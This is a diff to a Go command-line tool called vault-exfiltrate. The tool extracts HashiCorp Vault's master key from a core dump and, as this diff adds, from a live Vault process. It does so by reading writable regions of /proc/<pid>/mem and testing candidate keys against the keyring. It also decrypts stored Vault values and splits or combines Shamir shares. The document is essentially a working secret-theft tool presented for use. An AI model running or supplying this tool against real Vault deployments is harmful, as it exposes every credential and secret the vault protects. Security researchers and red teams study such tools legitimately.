@@ -1,26 +1,28 @@
 package main
 
 import (
+	"bufio"
 	"crypto/aes"
 	"crypto/cipher"
+	"debug/elf"
 	"encoding/base64"
 	"encoding/binary"
 	"fmt"
-	"io/ioutil"
+	"io"
 	"os"
-	"os/exec"
 	"strconv"
 	"strings"
+
+	"github.com/hashicorp/vault/shamir"
+	"golang.org/x/exp/mmap"
+
+	// vendored vault components
+	"github.com/slingamn/vault-exfiltrate/vault_components"
 )
 
-import "golang.org/x/exp/mmap"
-
-import "github.com/hashicorp/vault/shamir"
-import "github.com/hashicorp/vault/vault"
-
 const (
-	KeySize           = 32 // 256-bit key
-	AlignmentBoundary = 8  // assume malloc respects 64-bit word size?
+	KeySize           = 32             // 256-bit key
+	AlignmentBoundary = 8              // assume malloc respects 64-bit word size?
 	KeyringPath       = "core/keyring" // logical path where the keyring is stored
 )
 
@@ -29,41 +31,47 @@ type Region struct {
 	Length uint64
 }
 
-// shell out to `readelf` and get a list of RW regions in the core file
-func GetRegions(corePath string) ([]Region, error) {
-	readelfCmd := exec.Command("readelf", "--program-headers", corePath)
-	elfOut, err := readelfCmd.Output()
+// get the RW regions in the core file
+func GetRegions(corePath string) (result []Region, err error) {
+	file, err := elf.Open(corePath)
 	if err != nil {
-		return nil, err
+		return
 	}
-	result := make([]Region, 0)
-	lines := strings.Split(string(elfOut), "\n")
-	var currentRegion Region
-	inProcess := false
-	for i := 0; i < len(lines); i++ {
-		line := lines[i]
-		if strings.Index(line, "  LOAD") == 0 {
-			fields := strings.Fields(line)
-			start, err := strconv.ParseUint(fields[1], 0, 64)
-			if err != nil {
-				return nil, err
-			}
-			currentRegion = Region{Start: start, Length: 0}
-			inProcess = true
-		} else if inProcess {
-			fields := strings.Fields(line)
-			length, err := strconv.ParseUint(fields[0], 0, 64)
-			if err != nil {
-				return nil, err
-			}
-			currentRegion.Length = length
-			if fields[2] == "RW" {
-				result = append(result, currentRegion)
-			}
-			inProcess = false
+	defer file.Close()
+	for _, section := range file.Sections {
+		// TODO: also require SHF_ALLOC?
+		if section.Flags&elf.SHF_WRITE != 0 {
+			result = append(result, Region{Start: section.Offset, Length: section.Size})
 		}
 	}
-	return result, nil
+	return
+}
+
+func GetRegionsProc(pid int) (result []Region, err error) {
+	filename := fmt.Sprintf("/proc/%d/maps", pid)
+	file, err := os.Open(filename)
+	if err != nil {
+		return
+	}
+	defer file.Close()
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		fields := strings.Fields(scanner.Text())
+		// address, perms, offset, dev, inode, pathname
+		if strings.HasPrefix(fields[1], "rw") && fields[4] == "0" {
+			addressParts := strings.Split(fields[0], "-")
+			start, err := strconv.ParseUint(addressParts[0], 16, 64)
+			if err != nil {
+				return nil, err
+			}
+			end, err := strconv.ParseUint(addressParts[1], 16, 64)
+			if err != nil {
+				return nil, err
+			}
+			result = append(result, Region{Start: start, Length: end - start})
+		}
+	}
+	return
 }
 
 // create a `cipher.AEAD` from a key. this is apparently slow enough
@@ -86,9 +94,9 @@ func decryptInternal(path string, gcm cipher.AEAD, ciphertext []byte) ([]byte, e
 	out := make([]byte, 0, len(raw)-gcm.NonceSize())
 
 	switch ciphertext[4] {
-	case vault.AESGCMVersion1:
+	case vault_components.AESGCMVersion1:
 		return gcm.Open(out, nonce, raw, nil)
-	case vault.AESGCMVersion2:
+	case vault_components.AESGCMVersion2:
 		return gcm.Open(out, nonce, raw, []byte(path))
 	default:
 		return nil, fmt.Errorf("version bytes mis-match")
@@ -103,7 +111,7 @@ func Decrypt(path string, key []byte, plaintext []byte) ([]byte, error) {
 	return decryptInternal(path, gcm, plaintext)
 }
 
-func FindMasterKeyInRegion(coreMap *mmap.ReaderAt, region Region, keyRing []byte) ([]byte, error) {
+func FindMasterKeyInRegion(coreMap io.ReaderAt, region Region, keyRing []byte) ([]byte, error) {
 	lastPos := (region.Start + region.Length) - KeySize
 	keyBuf := make([]byte, KeySize)
 	for i := region.Start; i <= lastPos; i += AlignmentBoundary {
@@ -119,8 +127,8 @@ func FindMasterKeyInRegion(coreMap *mmap.ReaderAt, region Region, keyRing []byte
 	return nil, fmt.Errorf("key not found")
 }
 
-func FindMasterKey(corePath string, keyRingPath string) ([]byte, error) {
-	keyRing, err := ioutil.ReadFile(keyRingPath)
+func FindMasterKeyInCore(corePath string, keyRingPath string) ([]byte, error) {
+	keyRing, err := os.ReadFile(keyRingPath)
 	if err != nil {
 		return nil, err
 	}
@@ -145,13 +153,44 @@ func FindMasterKey(corePath string, keyRingPath string) ([]byte, error) {
 	return nil, fmt.Errorf("key not found")
 }
 
-func deserializeKeyring(keyRingFile string) (*vault.Keyring, error) {
-	keyRingJSON, err := ioutil.ReadFile(keyRingFile)
+func FindMasterKeyLive(pidStr string, keyRingPath string) (keyring []byte, err error) {
+	keyRing, err := os.ReadFile(keyRingPath)
+	if err != nil {
+		return
+	}
+
+	pid, err := strconv.Atoi(pidStr)
+	if err != nil {
+		return
+	}
+	regions, err := GetRegionsProc(pid)
+	if err != nil {
+		return
+	}
+
+	procMem, err := os.Open(fmt.Sprintf("/proc/%d/mem", pid))
+	if err != nil {
+		return
+	}
+	defer procMem.Close()
+
+	for i := 0; i < len(regions); i++ {
+		plaintext, err := FindMasterKeyInRegion(procMem, regions[i], keyRing)
+		if err == nil {
+			return plaintext, err
+		}
+	}
+
+	return nil, fmt.Errorf("key not found")
+}
+
+func deserializeKeyring(keyRingFile string) (*vault_components.Keyring, error) {
+	keyRingJSON, err := os.ReadFile(keyRingFile)
 	if err != nil {
 		return nil, err
 	}
 
-	keyRing, err := vault.DeserializeKeyring(keyRingJSON)
+	keyRing, err := vault_components.DeserializeKeyring(keyRingJSON)
 	if err != nil {
 		return nil, err
 	}
@@ -165,7 +204,7 @@ func DecryptFile(keyRingFile string, vaultPath string, valueFile string) ([]byte
 		return nil, err
 	}
 
-	ciphertext, err := ioutil.ReadFile(valueFile)
+	ciphertext, err := os.ReadFile(valueFile)
 	if err != nil {
 		return nil, err
 	}
@@ -179,25 +218,51 @@ func DecryptFile(keyRingFile string, vaultPath string, valueFile string) ([]byte
 	return Decrypt(vaultPath, termKey.Value, ciphertext)
 }
 
-func SecretShares(keyRingFile string, numShares string) ([][]byte, error) {
+func SecretShares(secret string, numShares string) (shares []string, err error) {
 	threshold, err := strconv.ParseUint(numShares, 0, 64)
 	if err != nil {
-		return nil, err
+		return
 	}
 
-	keyRing, err := deserializeKeyring(keyRingFile)
+	secretBytes, err := base64.StdEncoding.DecodeString(secret)
 	if err != nil {
-		return nil, err
+		return
 	}
 
 	t := int(threshold)
-	return shamir.Split(keyRing.MasterKey(), t, t)
+	sharesBytes, err := shamir.Split(secretBytes, t, t)
+	if err != nil {
+		return
+	}
+
+	shares = make([]string, len(sharesBytes))
+	for i, shareBytes := range sharesBytes {
+		shares[i] = base64.StdEncoding.EncodeToString(shareBytes)
+	}
+	return
+}
+
+func CombineShares(shares []string) (result string, err error) {
+	sharesBytes := make([][]byte, len(shares))
+	for i, share := range shares {
+		sharesBytes[i], err = base64.StdEncoding.DecodeString(share)
+		if err != nil {
+			return
+		}
+	}
+	resultBytes, err := shamir.Combine(sharesBytes)
+	if err != nil {
+		return
+	}
+	return base64.StdEncoding.EncodeToString(resultBytes), nil
 }
 
 func usage() {
-	os.Stderr.WriteString("usage: vault-exfiltrate extract core_file keyring_file\n")
+	os.Stderr.WriteString("usage: vault-exfiltrate extract vault_pid keyring_file\n")
+	os.Stderr.WriteString("or:    vault-exfiltrate extract-core core_file keyring_file\n")
 	os.Stderr.WriteString("or:    vault-exfiltrate decrypt keyring.json path/In/Vault data_file\n")
-	os.Stderr.WriteString("or:    vault-exfiltrate shares keyring.json num_shares\n")
+	os.Stderr.WriteString("or:    vault-exfiltrate split base64_encoded_value num_shares\n")
+	os.Stderr.WriteString("or:    vault-exfiltrate combine shares...\n")
 }
 
 func main_() int {
@@ -206,40 +271,62 @@ func main_() int {
 		return 1
 	}
 
-	if os.Args[1] == "extract" {
-		if len(os.Args) < 4 {
+	subcommand := strings.ToLower(os.Args[1])
+	args := os.Args[2:]
+
+	switch subcommand {
+	case "extract-core":
+		if len(args) < 2 {
 			usage()
 			return 1
 		}
-		keyring, err := FindMasterKey(os.Args[2], os.Args[3])
+		keyring, err := FindMasterKeyInCore(args[0], args[1])
 		if err != nil {
 			panic(err)
 		}
 		os.Stdout.Write(keyring)
 		return 0
-	} else if os.Args[1] == "decrypt" {
-		if len(os.Args) < 5 {
+	case "extract":
+		if len(args) < 2 {
 			usage()
 			return 1
 		}
-		plaintext, err := DecryptFile(os.Args[2], os.Args[3], os.Args[4])
+		keyring, err := FindMasterKeyLive(args[0], args[1])
+		if err != nil {
+			panic(err)
+		}
+		os.Stdout.Write(keyring)
+		return 0
+	case "decrypt":
+		if len(args) < 3 {
+			usage()
+			return 1
+		}
+		plaintext, err := DecryptFile(args[0], args[1], args[2])
 		if err != nil {
 			panic(err)
 		}
 		os.Stdout.Write(plaintext)
 		return 0
-	} else if os.Args[1] == "shares" {
-		if len(os.Args) < 4 {
+	case "split":
+		if len(args) < 2 {
 			usage()
 			return 1
 		}
-		shares, err := SecretShares(os.Args[2], os.Args[3])
+		shares, err := SecretShares(args[0], args[1])
 		if err != nil {
 			panic(err)
 		}
-		for i := 0; i < len(shares); i++ {
-			fmt.Println(base64.StdEncoding.EncodeToString(shares[i]))
+		for _, share := range shares {
+			fmt.Println(share)
 		}
+		return 0
+	case "combine":
+		combined, err := CombineShares(args)
+		if err != nil {
+			panic(err)
+		}
+		fmt.Println(combined)
 		return 0
 	}
 
